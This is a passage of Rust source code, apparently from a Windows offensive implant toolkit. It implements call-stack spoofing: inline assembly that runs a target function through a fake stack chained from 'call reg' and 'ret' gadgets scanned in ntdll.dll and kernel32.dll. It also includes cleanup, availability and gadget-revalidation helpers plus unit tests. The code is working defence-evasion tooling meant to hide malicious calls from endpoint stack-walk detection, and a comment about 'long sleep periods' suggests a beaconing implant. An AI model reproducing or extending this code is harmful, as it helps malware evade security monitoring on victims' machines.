        "42:",
        // Restore original RSP and RBP.
        "mov rsp, r14",
        "mov rbp, r15",

        // Restore callee-saved registers.
        "pop r15",
        "pop r14",
        "pop rdi",
        "pop rsi",
        "pop rbx",

        fake_rsp  = in(reg) fake_rsp,
        target    = in(reg) target_addr,
        gadget    = in(reg) innermost_gadget,
        nstack    = in(reg) nstack,
        stack_ptr = in(reg) stack_ptr,
        a1        = in(reg) arg1,
        a2        = in(reg) arg2,
        a3        = in(reg) arg3,
        a4        = in(reg) arg4,
        lateout("rax") status,
        out("rcx") _, out("rdx") _,
        out("r8")  _, out("r9")  _, out("r10") _, out("r11") _,
        out("rsi") _, out("rdi") _,
    );

    // The context will be dropped here, freeing the fake stack.
    ctx.original_rsp = 0;
    ctx.original_rbp = 0;
    drop(ctx);

    Ok(status)
}

/// Free the trampoline context and zeroise any residual data.
///
/// Explicit cleanup — callers who want to control exactly when the fake
/// stack is freed can call this instead of relying on `Drop`.
pub fn cleanup_trampoline(mut ctx: TrampolineContext) {
    // Drop handles zeroising + NtFreeVirtualMemory.
    // We just need to trigger the drop.
    ctx.stack_base = ctx.stack_base; // use the field to suppress warnings
    drop(ctx);
}

/// Return whether the trampoline-spoofing infrastructure is available.
///
/// Returns `true` if:
/// - At least one `call reg` gadget has been found
/// - At least one `ret`/`add rsp, N; ret` gadget has been found
/// - NT allocation/free functions are resolvable
pub fn is_available() -> bool {
    if resolve_nt_allocate_virtual_memory().is_none() {
        return false;
    }
    if resolve_nt_free_virtual_memory().is_none() {
        return false;
    }

    let gadgets = ensure_gadgets().lock_recover();
    let has_call = gadgets.iter().any(|g| g.kind == GadgetKind::CallReg);
    let has_ret = gadgets
        .iter()
        .any(|g| g.kind == GadgetKind::Ret || g.kind == GadgetKind::StackCleanupRet);
    has_call && has_ret
}

/// Return the number of cached trampoline gadgets.
pub fn gadget_count() -> usize {
    ensure_gadgets().lock_recover().len()
}

/// Revalidate all cached gadgets.
///
/// Should be called after long sleep periods to ensure cached addresses
/// are still valid (modules may have been unloaded/reloaded).
pub fn revalidate() {
    let mut gadgets = ensure_gadgets().lock_recover();
    *gadgets = populate_gadget_cache();
}

// ── Tests ───────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn frame_size_is_aligned() {
        assert_eq!(
            frame_size() % FRAME_ALIGN,
            0,
            "frame size must be 16-byte aligned"
        );
    }

    #[test]
    fn frame_size_is_64_bytes() {
        // 8 (ret addr) + 8 (rbp) + 32 (shadow) + 16 (locals) = 64
        assert_eq!(frame_size(), 64);
    }

    #[test]
    fn shadow_space_is_32_bytes() {
        assert_eq!(SHADOW_SPACE_SIZE, 32);
    }

    #[test]
    fn min_frames_is_at_least_3() {
        assert!(
            MIN_FRAMES >= 3,
            "need at least 3 frames for a plausible chain"
        );
    }

    #[test]
    fn max_frames_is_at_least_5() {
        assert!(MAX_FRAMES >= 5, "should support at least 5 frames");
    }

    #[test]
    fn default_frames_is_in_range() {
        assert!(DEFAULT_NUM_FRAMES >= MIN_FRAMES);
        assert!(DEFAULT_NUM_FRAMES <= MAX_FRAMES);
    }

    #[test]
    fn fake_stack_size_is_reasonable() {
        assert!(FAKE_STACK_SIZE >= 4096);
        assert!(FAKE_STACK_SIZE <= 1024 * 1024); // max 1 MB
    }

    #[test]
    fn gadget_patterns_are_non_empty() {
        for pattern in GADGET_PATTERNS.iter() {
            assert!(
                !pattern.bytes.is_empty(),
                "gadget pattern '{}' must not be empty",
                pattern.description
            );
        }
    }

    #[test]
    fn scan_dlls_are_populated() {
        assert!(!SCAN_DLLS.is_empty());
        assert!(SCAN_DLLS.contains(&"ntdll.dll"));
        assert!(SCAN_DLLS.contains(&"kernel32.dll"));
    }
}
